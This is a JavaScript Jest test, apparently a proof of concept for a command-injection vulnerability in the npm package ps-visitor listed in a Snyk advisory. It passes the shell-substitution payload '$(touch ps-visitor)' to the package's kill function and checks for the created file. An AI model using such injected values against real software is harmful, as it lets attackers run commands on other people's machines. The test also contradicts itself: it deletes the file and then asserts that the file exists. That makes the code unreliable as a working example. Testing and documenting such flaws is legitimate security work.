//https://snyk.io/vuln/SNYK-JS-PSVISITOR-1078544
test("Command Injection in ps-visitor", () => {
  const ps_visitor = require("ps-visitor");
  const fs = require("fs");
  const path = "./ps-visitor";
  const sleep = require("sleep");
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps_visitor.kill("$(touch ps-visitor)").catch(() => {});
  sleep.sleep(5);
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {});
});
